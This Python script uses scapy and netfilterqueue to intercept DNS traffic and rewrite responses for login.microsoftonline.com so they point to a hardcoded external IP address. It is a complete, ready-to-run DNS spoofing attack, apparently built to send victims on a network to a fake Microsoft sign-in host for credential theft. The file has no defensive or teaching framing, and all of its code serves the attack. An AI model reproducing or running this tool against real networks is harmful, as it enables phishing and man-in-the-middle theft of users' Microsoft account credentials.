from scapy.all import *
import netfilterqueue

# Define the target domain and the fake IP to redirect
TARGET_DOMAIN = "login.microsoftonline.com"
FAKE_IP = "3.149.241.54"  # Replace 'x' with the desired IP address

def process_packet(packet):
    """Process packets to sniff and modify DNS responses."""
    # Convert the packet from NetfilterQueue to a Scapy packet
    scapy_packet = IP(packet.get_payload())

    # Check if the packet has a DNS layer
    if scapy_packet.haslayer(DNSRR):
        # Check if the DNS response contains the target domain
        qname = scapy_packet[DNSQR].qname.decode()
        if TARGET_DOMAIN in qname:
            print(f"[+] Spoofing DNS response for {qname}")

            # Modify the DNS response
            scapy_packet[DNSRR].rdata = FAKE_IP

            # Recalculate packet checksums and lengths
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum

            # Set the modified packet as the payload
            packet.set_payload(bytes(scapy_packet))
        else:
            print(f"[-] Passing DNS response for {qname}")
    else:
        print("[-] Non-DNS packet, passing through.")

    # Forward the packet
    packet.accept()


def main():
    """Main function to set up packet interception."""
    print("[*] Starting DNS spoofing script...")
    queue = netfilterqueue.NetfilterQueue()
    try:
        # Bind the process_packet function to queue 0
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[!] Stopping script.")
    finally:
        queue.unbind()


if __name__ == "__main__":
    main()
